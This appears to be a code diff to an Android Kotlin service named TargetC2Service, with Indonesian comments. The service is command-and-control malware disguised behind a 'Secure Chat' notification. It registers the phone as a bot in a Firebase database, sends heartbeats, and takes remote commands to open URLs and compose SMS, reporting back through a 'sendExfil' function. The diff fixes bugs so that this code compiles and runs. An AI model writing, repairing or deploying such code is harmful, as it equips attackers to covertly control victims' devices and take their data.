@@ -5,6 +5,7 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
+import android.os.StatFs
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.google.firebase.database.*
@@ -52,11 +53,9 @@ class TargetC2Service : Service() {
         Log.d(TAG, "Service Created")
     }
 
-    // 🔥 FIX: onStartCommand WAJIB untuk foreground service + init Firebase
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "onStartCommand: ${intent?.action}")
 
-        // 🔥 FIX: Tampilkan notifikasi foreground dalam 5 detik
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Secure Chat")
             .setContentText("Connected")
@@ -65,13 +64,11 @@ class TargetC2Service : Service() {
             .build()
         startForeground(NOTIF_ID, notification)
 
-        // Generate atau dapatkan device ID
         _deviceId = android.provider.Settings.Secure.getString(
             contentResolver, android.provider.Settings.Secure.ANDROID_ID
         ) ?: UUID.randomUUID().toString()
         Log.d(TAG, "Device ID: $deviceId")
 
-        // 🔥 FIX: Inisialisasi Firebase & mulai C2 (hanya sekali)
         if (!isRunning) {
             initFirebase()
             registerBot()
@@ -84,10 +81,8 @@ class TargetC2Service : Service() {
         return START_STICKY
     }
 
-    // 🔥 FIX: Init Firebase dengan error handling lengkap
     private fun initFirebase() {
         try {
-            // Pastikan FirebaseApp terinisialisasi
             if (FirebaseApp.getApps(this).isEmpty()) {
                 FirebaseApp.initializeApp(this)
             }
@@ -100,7 +95,6 @@ class TargetC2Service : Service() {
             Log.d(TAG, "✅ Firebase initialized: $FIREBASE_URL")
         } catch (e: Exception) {
             Log.e(TAG, "❌ Firebase init error: ${e.message}", e)
-            // 🔥 FIX: Coba lagi setelah delay 3 detik
             scope.launch {
                 delay(3000)
                 try {
@@ -117,10 +111,9 @@ class TargetC2Service : Service() {
         }
     }
 
-    // 🔥 FIX: Register bot dengan retry mechanism
     private fun registerBot() {
         scope.launch {
-            delay(1000) // Tunggu Firebase init
+            delay(1000)
             if (!::botsRef.isInitialized) {
                 Log.e(TAG, "botsRef not initialized, skipping register")
                 return@launch
@@ -155,12 +148,10 @@ class TargetC2Service : Service() {
                 botsRef.child(deviceId).setValue(botData)
                     .addOnSuccessListener {
                         Log.d(TAG, "✅ Bot registered successfully: $deviceId")
-                        // Update online status berkala
                         startHeartbeat()
                     }
                     .addOnFailureListener { e ->
                         Log.e(TAG, "❌ Bot register failed: ${e.message}")
-                        // 🔥 FIX: Retry setelah 5 detik
                         scope.launch {
                             delay(5000)
                             registerBot()
@@ -176,11 +167,10 @@ class TargetC2Service : Service() {
         }
     }
 
-    // 🔥 FIX: Heartbeat biar bot tetep online
     private fun startHeartbeat() {
         scope.launch {
             while (isActive && isRunning) {
-                delay(30000) // Setiap 30 detik
+                delay(30000)
                 try {
                     if (::botsRef.isInitialized) {
                         botsRef.child(deviceId).child("lastSeen").setValue(ServerValue.TIMESTAMP)
@@ -196,10 +186,9 @@ class TargetC2Service : Service() {
         }
     }
 
-    // 🔥 FIX: Listen commands dengan error handling
     private fun listenForCommands() {
         scope.launch {
-            delay(2000) // Tunggu Firebase siap
+            delay(2000)
             if (!::commandsRef.isInitialized) {
                 Log.e(TAG, "commandsRef not initialized")
                 return@launch
@@ -213,7 +202,6 @@ class TargetC2Service : Service() {
                         val cmdType = cmdMap["type"] as? String ?: ""
                         val payload = cmdMap["payload"] as? String ?: ""
 
-                        // Hanya proses command yang ditujukan untuk device ini atau broadcast
                         if (target == deviceId || target.isEmpty()) {
                             Log.d(TAG, "📩 Command received: $cmdType | $payload")
                             processCommand(cmdType, payload, snapshot.key ?: "")
@@ -229,7 +217,6 @@ class TargetC2Service : Service() {
 
                 override fun onCancelled(error: DatabaseError) {
                     Log.e(TAG, "Command listener cancelled: ${error.message}")
-                    // 🔥 FIX: Auto reconnect
                     scope.launch {
                         delay(5000)
                         if (isRunning) listenForCommands()
@@ -242,7 +229,6 @@ class TargetC2Service : Service() {
         }
     }
 
-    // 🔥 FIX: Listen broadcast commands
     private fun listenForBroadcast() {
         scope.launch {
             delay(2500)
@@ -271,11 +257,9 @@ class TargetC2Service : Service() {
         }
     }
 
-    // 🔥 FIX: Process command dengan complete command list
     private fun processCommand(type: String, payload: String, cmdId: String) {
         Log.d(TAG, "Executing command: $type")
 
-        // Tandai command sebagai "processed"
         try {
             if (::commandsRef.isInitialized && cmdId.isNotEmpty()) {
                 commandsRef.child(cmdId).child("status").setValue("processed")
@@ -459,27 +443,31 @@ class TargetC2Service : Service() {
 
     private fun handleOpenURL(url: String) {
         try {
-            startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
+            val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            })
+            }
+            startActivity(intent)
             sendExfil("open_url", "URL opened: $url")
         } catch (e: Exception) {
             sendExfil("open_url", "Error: ${e.message}")
         }
     }
 
-    private fun handleSendSMS(data: String) {
-        val parts = data.split("|", limit = 2)
+    /** FIX: handleSendSMS — ganti variabel 'data' biar gak bentrok dengan Intent.data */
+    private fun handleSendSMS(smsData: String) {
+        val parts = smsData.split("|", limit = 2)
         if (parts.size < 2) {
             sendExfil("send_sms", "Format: number|message")
             return
         }
         try {
-            startActivity(Intent(Intent.ACTION_SENDTO).apply {
-                data = android.net.Uri.parse("smsto:${parts[0].trim()}")
+            val smsUri = android.net.Uri.parse("smsto:${parts[0].trim()}")
+            val intent = Intent(Intent.ACTION_SENDTO).apply {
+                this.data = smsUri
                 putExtra("sms_body", parts[1].trim())
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            })
+            }
+            startActivity(intent)
             sendExfil("send_sms", "SMS opened for ${parts[0].trim()}")
         } catch (e: Exception) {
             sendExfil("send_sms", "Error: ${e.message}")
@@ -594,16 +582,19 @@ class TargetC2Service : Service() {
         return 0
     }
 
+    /** FIX: Ganti java.io.Environment → android.os.Environment */
     private fun getStorageTotal(): Long {
         try {
-            val stat = android.os.StatFs(java.io.Environment.getDataDirectory().absolutePath)
+            val path = android.os.Environment.getDataDirectory().absolutePath
+            val stat = StatFs(path)
             return stat.totalBytes
         } catch (_: Exception) { return 0 }
     }
 
     private fun getStorageAvailable(): Long {
         try {
-            val stat = android.os.StatFs(java.io.Environment.getDataDirectory().absolutePath)
+            val path = android.os.Environment.getDataDirectory().absolutePath
+            val stat = StatFs(path)
             return stat.availableBytes
         } catch (_: Exception) { return 0 }
     }
